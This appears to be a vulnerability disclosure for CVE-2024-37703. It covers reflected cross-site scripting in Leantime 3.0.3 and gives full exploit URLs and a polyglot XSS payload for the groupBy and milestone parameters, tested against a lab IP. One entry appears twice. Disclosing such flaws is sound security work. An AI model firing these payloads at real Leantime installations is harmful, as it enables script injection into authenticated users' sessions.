CVE-2024-37703

Vulnerability:

URL:  ```https://192.168.124.138/tickets/showList?currentClient=0&groupBy=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(123) )%0D%0A%0d%0a</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(123)//>\x3e```

Payload: ```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(123) )%0D%0A%0d%0a</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(123)//>\x3e```

Action to trigger: None

Note: The client id may need to be replaced

Version: ‎3.0.3

Authenticated: Yes

User: Admin (possibly others)

Vulnerable Parameter:  groupBy

Vendor Website: https://leantime.io/




Vulnerability:

URL:  ```https://192.168.124.138/tickets/showKanban?currentClient=0&milestone=140jaVasCript:/*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)//%0D%0A%0d%0a//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert(%27XSS%27)//%3E\x3e&groupBy=all&groupBy=all&search=Search&projectId=3&termInput=test```

Payload: ```jaVasCript:/*-/*`/*\`/*%27/*%22/**/(/*%20*/oNcliCk=alert()%20)%0D%0A%0d%0a%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E\x3csVg/%3CsVg/oNloAd=alert(%27XSS%27)//%3E\x3e```

Action to trigger: None

Note: The projectId and client id may need to be replaced

Version: ‎3.0.3

Authenticated: Yes

User: Admin (possibly others)

Vulnerable Parameter: milestone

Vendor Website: https://leantime.io/




Vulnerability:

URL:  ```https://192.168.124.138/tickets/showList?currentClient=0&groupBy=jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(123) )%0D%0A%0d%0a</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(123)//>\x3e```

Payload: ```jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(123) )%0D%0A%0d%0a</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(123)//>\x3e```

Action to trigger: None

Note: The client id may need to be replaced

Version: ‎3.0.3

Authenticated: Yes

User: Admin (possibly others)

Vulnerable Parameter: groupBy

Vendor Website: https://leantime.io/



Demo:
![](https://github.com/4rdr/proofs/blob/main/gifs/leantime_3.0.3_Reflected_XSS_via_multiple_parameters.gif)
